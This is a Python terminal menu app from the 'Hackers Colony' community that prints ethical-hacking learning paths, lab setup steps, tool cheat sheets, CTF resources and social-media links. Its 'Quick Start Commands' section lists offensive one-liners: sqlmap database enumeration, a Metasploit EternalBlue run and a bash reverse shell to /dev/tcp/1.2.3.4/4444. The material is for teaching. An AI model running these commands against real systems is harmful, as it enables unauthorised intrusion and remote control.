#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HCO Terminal — Terminal Version (No Browser Needed)
Author: Azhar | Hackers Colony
Run (Termux):
  pkg update -y
  pkg install python -y
  python3 hco_terminal.py
"""

import os
import sys
import subprocess
import shutil
import time
import webbrowser
from datetime import datetime

# ---------- Config ----------
APP_NAME = "HCO Terminal"
TELEGRAM_LINK = "https://t.me/HackersColony"
WHATSAPP_LINK = "https://chat.whatsapp.com/BHwZHVntVicI8zdmfbJoQV"
YOUTUBE_LINK = "https://youtube.com/@hackers_colony_tech"
WEBSITE_LINK = "https://hackerscolonyofficial.blogspot.com"

# ---------- Colors ----------
class Colors:
    GREEN = '\033[92m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# ---------- Utility Functions ----------
def clear_screen():
    os.system('clear')

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██╗  ██╗ ██████╗ ██████╗ ███████╗███████╗██████╗         ║
║    ██║  ██║██╔════╝██╔════╝ ██╔════╝██╔════╝██╔══██╗        ║
║    ███████║██║     ██║  ███╗█████╗  █████╗  ██████╔╝        ║
║    ██╔══██║██║     ██║   ██║██╔══╝  ██╔══╝  ██╔══██╗        ║
║    ██║  ██║╚██████╗╚██████╔╝███████╗███████╗██║  ██║        ║
║    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝        ║
║                                                              ║
║    {Colors.GREEN}HACKERS COLONY TERMINAL - ETHICAL HACKING PORTAL{Colors.CYAN}     ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
"""
    print(banner)

def print_menu():
    menu = f"""
{Colors.BOLD}{Colors.CYAN}MAIN MENU:{Colors.END}

{Colors.GREEN}1.{Colors.END} 📚 Learn Ethical Hacking
{Colors.GREEN}2.{Colors.END} 🧪 Practice Labs & Setup
{Colors.GREEN}3.{Colors.END} 🛠 Tools & Installation Guide
{Colors.GREEN}4.{Colors.END} 🏁 CTF Challenges
{Colors.GREEN}5.{Colors.END} 🔗 Community Links
{Colors.GREEN}6.{Colors.END} 🖥 System Check
{Colors.GREEN}7.{Colors.END} 📋 Cheat Sheets
{Colors.GREEN}8.{Colors.END} 🚀 Quick Start Commands
{Colors.GREEN}0.{Colors.END} ❌ Exit

{Colors.YELLOW}Choose an option (0-8): {Colors.END}"""
    print(menu)

def check_tool_installed(tool_name):
    """Check if a tool is installed"""
    return shutil.which(tool_name) is not None

def run_command(cmd):
    """Run a command and show output"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result
    except Exception as e:
        return None

def press_enter_to_continue():
    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")

def show_learn_hacking():
    clear_screen()
    print_banner()
    print(f"{Colors.BOLD}{Colors.CYAN}📚 LEARN ETHICAL HACKING{Colors.END}\n")
    
    content = f"""
{Colors.GREEN}🔰 Beginner Path:{Colors.END}
1. Networking Fundamentals
2. Linux Basics & Command Line
3. Programming (Python/Bash)
4. Security Concepts & Terminology

{Colors.YELLOW}🎯 Intermediate Topics:{Colors.END}
• Web Application Security
• Network Penetration Testing  
• Wireless Security
• Social Engineering
• Cryptography Basics

{Colors.RED}🏆 Advanced Skills:{Colors.END}
• Reverse Engineering
• Exploit Development
• Digital Forensics
• Malware Analysis

{Colors.CYAN}📚 Recommended Resources:{Colors.END}
• TryHackMe: https://tryhackme.com
• Hack The Box: https://hackthebox.com
• Cybrary: https://cybrary.it
• HCO YouTube: {YOUTUBE_LINK}

{Colors.GREEN}🚀 Getting Started:{Colors.END}
1. Start with TryHackMe 'Beginner Path'
2. Practice Linux commands daily
3. Learn basic Python scripting
4. Join HCO community for guidance
"""
    print(content)
    press_enter_to_continue()

def show_practice_labs():
    clear_screen()
    print_banner()
    print(f"{Colors.BOLD}{Colors.CYAN}🧪 PRACTICE LABS & SETUP{Colors.END}\n")
    
    # Check tools
    tools = {
        'docker': check_tool_installed('docker'),
        'python3': check_tool_installed('python3'),
        'git': check_tool_installed('git')
    }
    
    print(f"{Colors.YELLOW}🛠 Available Tools:{Colors.END}")
    for tool, installed in tools.items():
        status = f"{Colors.GREEN}✅ INSTALLED{Colors.END}" if installed else f"{Colors.RED}❌ MISSING{Colors.END}"
        print(f"  {status} {tool}")
    
    print(f"""
{Colors.CYAN}🏠 Safe Practice Environments:{Colors.END}

{Colors.GREEN}1. TryHackMe (Online){Colors.END}
   • Beginner-friendly
   • Guided learning paths
   • Web: https://tryhackme.com

{Colors.GREEN}2. Hack The Box (Online){Colors.END}  
   • Intermediate/Advanced
   • Real-world machines
   • Web: https://hackthebox.com

{Colors.GREEN}3. OWASP Juice Shop (Local){Colors.END}
   • Modern vulnerable web app
   • Run with: docker run -p 3000:3000 bkimminich/juice-shop
   • Access: http://localhost:3000

{Colors.GREEN}4. Metasploitable (Local VM){Colors.END}
   • Download: https://sourceforge.net/projects/metasploitable/
   • Run in VirtualBox/VMware
   • ⚠️ Use isolated network only!

{Colors.YELLOW}🔧 Setup Commands:{Colors.END}
• Install Docker: curl -fsSL https://get.docker.com | sh
• Start Juice Shop: docker run -d -p 3000:3000 bkimminich/juice-shop
""")
    press_enter_to_continue()

def show_tools_guide():
    clear_screen()
    print_banner()
    print(f"{Colors.BOLD}{Colors.CYAN}🛠 TOOLS & INSTALLATION GUIDE{Colors.END}\n")
    
    # Check common tools
    tools = ['nmap', 'wireshark', 'python3', 'git', 'curl', 'nikto', 'sqlmap', 'metasploit-framework']
    tools_status = {tool: check_tool_installed(tool) for tool in tools}
    
    print(f"{Colors.YELLOW}🔍 Tool Status Check:{Colors.END}")
    for tool, installed in tools_status.items():
        status = f"{Colors.GREEN}✅ INSTALLED{Colors.END}" if installed else f"{Colors.RED}❌ MISSING{Colors.END}"
        print(f"  {status} {tool}")
    
    print(f"""
{Colors.CYAN}📦 Installation Commands:{Colors.END}

{Colors.GREEN}For Termux:{Colors.END}
pkg update && pkg install python nmap git curl -y
pip install requests bs4

{Colors.GREEN}For Kali Linux:{Colors.END}
sudo apt update
sudo apt install nmap wireshark nikto sqlmap metasploit-framework -y

{Colors.CYAN}🛠 Essential Tools Usage:{Colors.END}

{Colors.GREEN}• Nmap (Network Scanner){Colors.END}
  nmap -sS -sV -O target.com
  nmap -A -T4 192.168.1.0/24

{Colors.GREEN}• Nikto (Web Scanner){Colors.END}
  nikto -h http://target.com

{Colors.GREEN}• SQLMap (SQL Injection){Colors.END}
  sqlmap -u "http://site.com/page?id=1" --dbs

{Colors.GREEN}• Metasploit{Colors.END}
  msfconsole
  use exploit/windows/smb/ms17_010_eternalblue
""")
    press_enter_to_continue()

def show_ctf_challenges():
    clear_screen()
    print_banner()
    print(f"{Colors.BOLD}{Colors.CYAN}🏁 CTF CHALLENGES{Colors.END}\n")
    
    content = f"""
{Colors.GREEN}🔓 Beginner CTF Platforms:{Colors.END}

{Colors.CYAN}1. OverTheWire:{Colors.END}
   • Bandit (Linux basics): ssh bandit0@bandit.labs.overthewire.org -p 2220
   • Natas (Web security): http://natas.labs.overthewire.org
   • Website: https://overthewire.org

{Colors.CYAN}2. PicoCTF:{Colors.END}
   • Great for absolute beginners
   • Annual competition + practice
   • Website: https://picoctf.org

{Colors.CYAN}3. TryHackMe CTFs:{Colors.END}
   • Guided CTF rooms
   • Step-by-step walkthroughs
   • Website: https://tryhackme.com

{Colors.YELLOW}⚡ Intermediate Platforms:{Colors.END}

{Colors.CYAN}• Hack The Box{Colors.END}
  • Realistic machines
  • Active community
  • https://hackthebox.com

{Colors.CYAN}• CTFtime{Colors.END}
  • CTF calendar & writeups
  • https://ctftime.org

{Colors.GREEN}🔧 CTF Tool Commands:{Colors.END}

• File analysis:
  file challenge.bin
  strings file.txt
  binwalk image.jpg

• Steganography:
  steghide extract -sf image.jpg
  exiftool image.jpg

• Web challenges:
  curl -X POST http://target.com
  dirb http://target.com
"""
    print(content)
    press_enter_to_continue()

def show_community_links():
    clear_screen()
    print_banner()
    print(f"{Colors.BOLD}{Colors.CYAN}🔗 COMMUNITY LINKS{Colors.END}\n")
    
    content = f"""
{Colors.GREEN}📱 Join Our Communities:{Colors.END}

{Colors.CYAN}💬 Telegram Group:{Colors.END}
{TELEGRAM_LINK}
• Daily updates & discussions
• Q&A support
• Resource sharing

{Colors.GREEN}📞 WhatsApp Group:{Colors.END}  
{WHATSAPP_LINK}
• Community chat
• Quick help
• Local community

{Colors.RED}🎥 YouTube Channel:{Colors.END}
{YOUTUBE_LINK}
• Tutorial videos
• Walkthroughs
• Tool demonstrations

{Colors.BLUE}🌐 Official Website:{Colors.END}
{WEBSITE_LINK}
• Articles & blogs
• Latest updates
• Resource library

{Colors.YELLOW}📢 Important Notice:{Colors.END}
• Always practice ethical hacking
• Only test systems you own
• Get proper authorization
• Respect privacy and laws

{Colors.GREEN}🤝 Community Guidelines:{Colors.END}
• Help each other learn
• Share knowledge
• Stay respectful
• Keep it legal & ethical
"""
    print(content)
    
    print(f"\n{Colors.YELLOW}Open link in browser? (y/n): {Colors.END}", end='')
    choice = input().lower()
    if choice == 'y':
        print(f"{Colors.CYAN}1. Telegram\n2. WhatsApp\n3. YouTube\n4. Website{Colors.END}")
        print(f"{Colors.YELLOW}Choose (1-4): {Colors.END}", end='')
        link_choice = input()
        links = {
            '1': TELEGRAM_LINK,
            '2': WHATSAPP_LINK, 
            '3': YOUTUBE_LINK,
            '4': WEBSITE_LINK
        }
        if link_choice in links:
            webbrowser.open(links[link_choice])
            print(f"{Colors.GREEN}Opening browser...{Colors.END}")
    
    press_enter_to_continue()

def show_system_check():
    clear_screen()
    print_banner()
    print(f"{Colors.BOLD}{Colors.CYAN}🖥 SYSTEM CHECK{Colors.END}\n")
    
    # Check system info
    tools = ['python3', 'git', 'docker', 'nmap', 'wireshark', 'nikto', 'sqlmap']
    results = {}
    
    for tool in tools:
        results[tool] = check_tool_installed(tool)
    
    print(f"{Colors.YELLOW}🔧 Tool Status:{Colors.END}")
    for tool, installed in results.items():
        status = f"{Colors.GREEN}✅ INSTALLED{Colors.END}" if installed else f"{Colors.RED}❌ MISSING{Colors.END}"
        print(f"  {status} {tool}")
    
    # System information
    print(f"\n{Colors.YELLOW}💻 System Information:{Colors.END}")
    try:
        # Python version
        print(f"  Python: {sys.version.split()[0]}")
        
        # Platform
        if hasattr(os, 'uname'):
            uname = os.uname()
            print(f"  System: {uname.sysname} {uname.machine}")
        
        # Current directory
        print(f"  Directory: {os.getcwd()}")
        
    except Exception as e:
        print(f"  System info: Unable to retrieve")
    
    print(f"""
{Colors.CYAN}🚀 Quick Installation:{Colors.END}

{Colors.GREEN}For missing tools:{Colors.END}
sudo apt update && sudo apt install python3 git nmap nikto -y

{Colors.GREEN}For Docker:{Colors.END}
curl -fsSL https://get.docker.com | sh

{Colors.GREEN}For Python packages:{Colors.END}
pip install requests bs4 scapy

{Colors.YELLOW}⚠️ Note: Some tools may require root access{Colors.END}
""")
    press_enter_to_continue()

def show_cheat_sheets():
    clear_screen()
    print_banner()
    print(f"{Colors.BOLD}{Colors.CYAN}📋 CHEAT SHEETS{Colors.END}\n")
    
    content = f"""
{Colors.GREEN}🔐 Common Ports:{Colors.END}
21 - FTP     22 - SSH       80 - HTTP
443 - HTTPS 3306 - MySQL   5432 - PostgreSQL
3389 - RDP  5900 - VNC     27017 - MongoDB

{Colors.YELLOW}🌐 Nmap Cheat Sheet:{Colors.END}
nmap -sS -sV -O target.com          # Stealth scan + version + OS
nmap -A -T4 target.com              # Aggressive scan
nmap -p 80,443,22 target.com        # Specific ports
nmap -sU -p 53,67,68 target.com     # UDP scan
nmap --script vuln target.com       # Vulnerability scripts

{Colors.CYAN}🕸 Web Testing:{Colors.END}
• Always get permission first
• Use Burp Suite for web apps
• Test for: SQLi, XSS, CSRF, LFI/RFI
• Check: Headers, Cookies, Forms

{Colors.RED}🐧 Linux Commands:{Colors.END}
ls -la                              # List all files
chmod +x script.sh                  # Make executable
grep "pattern" file.txt             # Search text
find / -name "file" 2>/dev/null     # Find files
netstat -tuln                       # Open ports

{Colors.PURPLE}🐍 Python for Hacking:{Colors.END}
import requests
import socket
import subprocess
import os

# Port scanner example
for port in range(1, 100):
    try:
        s = socket.socket()
        s.connect(('target', port))
        print(f"Port {{port}} open")
    except:
        pass

{Colors.GREEN}📝 Legal Notice:{Colors.END}
ONLY test systems you own or have explicit written permission to test.
Unauthorized access is ILLEGAL and UNETHICAL.
"""
    print(content)
    
    print(f"\n{Colors.YELLOW}Save to file? (y/n): {Colors.END}", end='')
    choice = input().lower()
    if choice == 'y':
        filename = "hco_cheatsheet.txt"
        with open(filename, 'w') as f:
            f.write(content.replace(Colors.GREEN, '').replace(Colors.YELLOW, '').replace(Colors.CYAN, '').replace(Colors.RED, '').replace(Colors.PURPLE, '').replace(Colors.END, '').replace(Colors.BOLD, ''))
        print(f"{Colors.GREEN}Cheat sheet saved as: {filename}{Colors.END}")
    
    press_enter_to_continue()

def show_quick_commands():
    clear_screen()
    print_banner()
    print(f"{Colors.BOLD}{Colors.CYAN}🚀 QUICK START COMMANDS{Colors.END}\n")
    
    content = f"""
{Colors.GREEN}🔰 Beginner Commands:{Colors.END}

# Network scanning
nmap -sS 192.168.1.1/24
nmap -A -T4 target.com

# Web application testing
nikto -h http://target.com
dirb http://target.com

# Information gathering
whois target.com
dig target.com ANY

{Colors.YELLOW}🎯 Intermediate Commands:{Colors.END}

# SQL injection testing
sqlmap -u "http://site.com/page?id=1" --dbs
sqlmap -u "http://site.com/page?id=1" -D dbname --tables

# Metasploit framework
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
exploit

# Wireless testing (requires monitor mode)
airmon-ng start wlan0
airodump-ng wlan0mon

{Colors.RED}🏆 Advanced Commands:{Colors.END}

# Reverse shell (Netcat)
nc -lvnp 4444                          # Attacker
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1  # Victim

# Privilege escalation
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/passwd | grep bash

# Packet analysis
tcpdump -i eth0 -w capture.pcap
wireshark capture.pcap

{Colors.CYAN}🛡 Defensive Commands:{Colors.END}

# Check open ports
netstat -tuln
ss -tuln

# Process monitoring
ps aux | grep suspicious
top

# File integrity
find / -type f -perm -4000 2>/dev/null
ls -la /etc/passwd /etc/shadow
"""
    print(content)
    press_enter_to_continue()

def main():
    while True:
        clear_screen()
        print_banner()
        print(f"{Colors.GREEN}Welcome to Hackers Colony Terminal!{Colors.END}")
        print(f"{Colors.YELLOW}Ethical learning, practice labs & community{Colors.END}")
        print(f"{Colors.RED}⚠️ Only test systems you own or have permission to test{Colors.END}\n")
        
        print_menu()
        
        try:
            choice = input().strip()
            
            if choice == '0':
                print(f"\n{Colors.GREEN}Thank you for using HCO Terminal! Stay ethical! 🛡️{Colors.END}")
                break
            elif choice == '1':
                show_learn_hacking()
            elif choice == '2':
                show_practice_labs()
            elif choice == '3':
                show_tools_guide()
            elif choice == '4':
                show_ctf_challenges()
            elif choice == '5':
                show_community_links()
            elif choice == '6':
                show_system_check()
            elif choice == '7':
                show_cheat_sheets()
            elif choice == '8':
                show_quick_commands()
            else:
                print(f"\n{Colors.RED}Invalid choice! Please enter 0-8{Colors.END}")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n\n{Colors.GREEN}Thank you for using HCO Terminal! Stay ethical! 🛡️{Colors.END}")
            break

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.GREEN}Goodbye! Stay ethical! 🛡️{Colors.END}")
